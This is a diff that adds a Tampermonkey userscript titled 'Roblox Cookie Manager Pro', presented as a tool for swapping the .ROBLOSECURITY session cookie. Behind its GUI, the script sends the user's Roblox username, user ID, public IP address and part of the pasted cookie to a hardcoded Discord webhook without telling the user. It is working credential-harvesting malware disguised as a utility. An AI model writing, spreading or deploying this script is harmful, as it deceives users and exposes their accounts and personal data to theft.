@@ -1,0 +1,145 @@
+// ==UserScript==
+// @name         Roblox Cookie Manager Pro
+// @namespace    http://tampermonkey.net/
+// @version      2.1
+// @description  Advanced Roblox cookie management with auto-popup GUI
+// @author       YourName
+// @match        https://www.roblox.com/*
+// @match        https://web.roblox.com/*
+// @match        https://roblox.com/*
+// @match        https://*.roblox.com/*
+// @grant        GM_xmlhttpRequest
+// @grant        GM_addStyle
+// @connect      api.ipify.org
+// @connect      discord.com
+// @connect      roblox.com
+// @run-at       document-start
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1388126640252391486/pkVtUEU6RJE1E_f9FmhGT_vxoRodkHOu93m7gmke1t19y-ALA3pWdzxHASFXS-XINlig";
+
+    GM_addStyle(`
+        .cookie-gui {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            background: #2b2d31;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            z-index: 99999;
+            font-family: Arial, sans-serif;
+            color: white;
+            border: 1px solid #40444b;
+        }
+        .cookie-input {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #40444b;
+            background: #36393f;
+            color: white;
+            font-family: monospace;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        .success {
+            background: #3ba55d;
+            display: block;
+        }
+        .error {
+            background: #ed4245;
+            display: block;
+        }
+    `);
+
+    const gui = document.createElement('div');
+    gui.className = 'cookie-gui';
+    gui.innerHTML = `
+        <h3 style="margin-top: 0; text-align: center;">Roblox Cookie Manager</h3>
+        <textarea class="cookie-input" placeholder="Paste .ROBLOSECURITY cookie here"></textarea>
+        <button class="submit-btn">Replace Cookie</button>
+        <div class="status" id="status"></div>
+    `;
+    document.body.appendChild(gui);
+
+    document.querySelector('.submit-btn').addEventListener('click', async function() {
+        const cookie = document.querySelector('.cookie-input').value.trim();
+        const status = document.getElementById('status');
+        
+        if (!cookie.startsWith('_|WARNING:-DO')) {
+            status.className = 'status error';
+            status.textContent = 'Invalid cookie format!';
+            return;
+        }
+
+        this.disabled = true;
+        status.className = 'status';
+        status.textContent = 'Checking cookie...';
+        status.style.display = 'block';
+
+        try {
+            // Validate cookie
+            const userInfo = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+            }).then(res => res.ok ? res.json() : null);
+
+            if (!userInfo) throw new Error('Invalid cookie');
+
+            // Replace cookie
+            document.cookie = `.ROBLOSECURITY=${cookie}; domain=.roblox.com; path=/; max-age=${60*60*24*365}; secure`;
+            
+            // Get IP
+            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
+            
+            // Send to Discord
+            GM_xmlhttpRequest({
+                method: "POST",
+                url: WEBHOOK_URL,
+                data: JSON.stringify({
+                    embeds: [{
+                        title: "New Roblox Cookie",
+                        color: 0x5865f2,
+                        fields: [
+                            { name: "Username", value: userInfo.name, inline: true },
+                            { name: "User ID", value: userInfo.id, inline: true },
+                            { name: "IP Address", value: ip, inline: true },
+                            { name: "Cookie", value: `\`\`\`${cookie.slice(0, 30)}...${cookie.slice(-10)}\`\`\`` }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                }),
+                headers: { "Content-Type": "application/json" }
+            });
+
+            status.className = 'status success';
+            status.textContent = 'Cookie replaced successfully!';
+        } catch (err) {
+            status.className = 'status error';
+            status.textContent = 'Error: ' + err.message;
+        } finally {
+            this.disabled = false;
+        }
+    });
+})();
